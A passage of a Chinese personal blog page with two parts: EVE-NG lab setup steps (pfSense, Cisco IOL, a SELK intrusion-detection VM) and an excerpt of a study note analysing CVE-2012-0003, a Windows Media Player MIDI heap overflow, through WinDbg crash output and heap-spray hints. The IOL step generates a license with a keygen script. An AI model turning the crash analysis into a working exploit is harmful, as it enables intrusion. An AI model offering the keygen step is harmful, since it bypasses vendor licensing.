<li><p>从<a href="https://nyifiles.pfsense.org/mirror/downloads/pfSense-CE-memstick-serial-2.4.5-RELEASE-amd64.img.gz下载pfsense" target="_blank" rel="noopener">https://nyifiles.pfsense.org/mirror/downloads/pfSense-CE-memstick-serial-2.4.5-RELEASE-amd64.img.gz下载pfsense</a> image</p>
</li>
<li><p>gzip pfSense-CE-memstick-serial-2.4.5-RELEASE-amd64.img.gz -d .得到pfSense-CE-memstick-serial-2.4.5-RELEASE-amd64.img</p>
</li>
<li><p>创建virtioa.qcow2</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mkdir /opt/unetlab/addons/qemu/pfsense-CE-2.4.5/</span><br><span class="line">mv pfSense-CE-memstick-serial-2.4.5-RELEASE-amd64.img install.img</span><br><span class="line">/opt/qemu/bin/qemu-img create -f qcow2 virtioa.qcow2 2G</span><br><span class="line">/opt/qemu/bin/qemu-system-x86_64 -hda install.img -hdb virtioa.qcow2 -nographic</span><br></pre></td></tr></table></figure>
</li>
<li><p>默认next，安装完成后不要选reboot，选择shell，然后poweroff并rm install.img</p>
</li>
<li><p>修正权限</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/opt/unetlab/wrappers/unl_wrapper -a fixpermissions</span><br></pre></td></tr></table></figure>
</li>
<li><p>在eve-ng拓扑中新建一个pfsense的node</p>
</li>
<li><p>通过vnc/html配置安装</p>
<ul>
<li>配置vtnet0口为WAN口,vtnet1为LAN口<h2 id="refer-3"><a href="#refer-3" class="headerlink" title="refer"></a>refer</h2><a href="https://www.eve-ng.net/index.php/documentation/howtos/howto-add-pfsense-fw-2-4/" target="_blank" rel="noopener">https://www.eve-ng.net/index.php/documentation/howtos/howto-add-pfsense-fw-2-4/</a></li>
</ul>
</li>
</ol>
<h1 id="cisco-switch镜像搭建"><a href="#cisco-switch镜像搭建" class="headerlink" title="cisco switch镜像搭建"></a>cisco switch镜像搭建</h1><ol>
<li><p>下载cisco IOL ，CiscoIOUKeygen.py上传/opt/unetlab/addons/iol/bin目录下</p>
</li>
<li><p>生成自己的lincense </p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python CiscoIOUKeygen.py | grep -A 1 &apos;license&apos; &gt; iourc</span><br></pre></td></tr></table></figure>
</li>
</ol>
<ol start="3">
<li>修正权限 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/opt/unetlab/wrappers/unl_wrapper -a fixpermissions</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h2 id="refer-4"><a href="#refer-4" class="headerlink" title="refer"></a>refer</h2><p><a href="https://www.eve-ng.net/index.php/documentation/howtos/howto-add-cisco-iol-ios-on-linux/" target="_blank" rel="noopener">https://www.eve-ng.net/index.php/documentation/howtos/howto-add-cisco-iol-ios-on-linux/</a></p>
<h1 id="网络入侵检测镜像搭建"><a href="#网络入侵检测镜像搭建" class="headerlink" title="网络入侵检测镜像搭建"></a>网络入侵检测镜像搭建</h1><ol>
<li>下载SELK ISO ，拷贝到/opt/unetlab/addons/qemu/linux-SELK-6.0目录下，重命名iso为cdrom.iso</li>
<li><p>在/opt/unetlab/addons/qemu/linux-SELK-6.0/创建virtioa.qcow2 </p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/opt/qemu/bin/qemu-img create -f qcow2 virtioa.qcow2 20G</span><br></pre></td></tr></table></figure>
</li>
<li><p>在eve-ng拓扑中新建一个selk的node,并通过vnc安装</p>
</li>
<li>安装完成后删除cdrom.iso  </li>
</ol>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/09/19/漏洞战争/堆溢出/2/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="xxx">
      <meta itemprop="description" content>
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="My blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2018/09/19/漏洞战争/堆溢出/2/" class="post-title-link" itemprop="url">cve-2012-0003 Microsoft Windows Media Player winmm.dll MIDI文件堆溢出漏洞</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2018-09-19 23:23:27" itemprop="dateCreated datePublished" datetime="2018-09-19T23:23:27+08:00">2018-09-19</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2019-04-08 01:07:44" itemprop="dateModified" datetime="2019-04-08T01:07:44+08:00">2019-04-08</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/《漏洞战争》学习笔记/" itemprop="url" rel="index"><span itemprop="name">《漏洞战争》学习笔记</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/《漏洞战争》学习笔记/第二章-堆溢出/" itemprop="url" rel="index"><span itemprop="name">第二章-堆溢出</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>一、找到漏洞触发函数<br>windbg附加iexplore.exe,加载POC文件。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">0:009&gt; g</span><br><span class="line">(bfc.c78): Access violation - code c0000005 (first chance)</span><br><span class="line">First chance exceptions are reported before any exception handling.</span><br><span class="line">This exception may be expected and handled.</span><br><span class="line">eax=001d5a2c ebx=00000000 ecx=0c0c0c0c edx=0000003d esi=001be3f8 edi=01776230</span><br><span class="line">eip=7e38dfe8 esp=0012e198 ebp=0012e1a8 iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010202</span><br><span class="line">*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\WINDOWS\system32\mshtml.dll - </span><br><span class="line">mshtml!CreateHTMLPropertyPage+0x38108:</span><br><span class="line">7e38dfe8 ff5104          call    dword ptr [ecx+4]    ds:0023:0c0c0c10=????????</span><br></pre></td></tr></table></figure></p>
<p>程序在该位置中断，可以看到程序在call [ecx+4]，且[ecx+4]地址为0c0c0c10,而且调试的程序很容易就想到针对堆溢出的heap spray漏洞利用方法，而且并没有在0c0c0c10申请shellcode导致程序中断。<br>因此暂时猜测是堆溢出漏洞，通过gflags.exe -i iexplore.exe +hpa开启堆页检测，再次运行IE，加载POC。<br>
          <!--noindex-->
            <div class="post-button">
              <a class="btn" href="/2018/09/19/漏洞战争/堆溢出/2/#more" rel="contents">
                阅读全文 &raquo;
              </a>
            </div>
          <!--/noindex-->
        
      
    </p></div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/2/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/4/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">xxx</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">38</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">15</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">xxx</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>
<script src="/js/utils.js"></script><script src="/js/motion.js"></script>
<script src="/js/schemes/muse.js"></script>
<script src="/js/next-boot.js"></script>



  















  

  

</body>
</html>
